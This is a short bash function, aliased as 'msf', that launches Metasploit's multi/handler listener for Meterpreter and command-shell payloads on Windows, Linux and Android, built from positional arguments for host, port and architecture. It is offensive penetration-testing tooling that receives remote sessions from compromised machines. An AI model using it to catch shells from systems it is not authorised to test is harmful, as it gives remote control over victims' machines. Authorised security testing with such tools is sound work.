
listener() {

  if [[ "$1" == "windows" ]] && [[ "$2" == "msf" ]] && [[ "$7" == "x64" ]]; then
    command="use exploit/multi/handler;set payload windows/x64/meterpreter/$3_$4;set lhost $5;set lport $6;exploit"
    msfconsole -x "$command"
  elif [[ "$1" == "windows" ]] && [[ "$2" == "msf" ]]; then
    command="use exploit/multi/handler;set payload windows/meterpreter/$3_$4;set lhost $5;set lport $6;exploit"
    msfconsole -x "$command"
    #printf "%s" $command
  elif [[ "$1" == "windows" ]] && [[ "$2" == "cmd" ]]; then
    command="use exploit/multi/handler;set payload windows/shell/$3_$4;set lhost $5;set lport $6;exploit"
    msfconsole -x "$command"
    #printf "%s" $command

  elif [[ "$1" == "linux" ]] && [[ "$2" == "msf" ]] && [[ "$7" == "x86" ]]; then
    command="use exploit/multi/handler;set payload linux/x86/meterpreter/$3_$4;set lhost $5;set lport $6;exploit"
    msfconsole -x "$command"
  elif [[ "$1" == "linux" ]] && [[ "$2" == "msf" ]] && [[ "$7" == "x64" ]]; then
    command="use exploit/multi/handler;set payload linux/x64/meterpreter/$3_$4;set lhost $5;set lport $6;exploit"
    msfconsole -x "$command"
  elif [[ "$1" == "linux" ]] && [[ "$2" == "shell" ]] && [[ "$7" == "x86" ]]; then
    command="use exploit/multi/handler;set payload linux/x86/shell/$3_$4;set lhost $5;set lport $6;exploit"
    msfconsole -x "$command"
  elif [[ "$1" == "android" ]] && [[ "$2" == "msf" ]]; then
    command="use exploit/multi/handler;set payload android/meterpreter/$3_$4;set lhost $5;set lport $6;exploit"
    msfconsole -x "$command"

  fi
  }
alias msf=listener
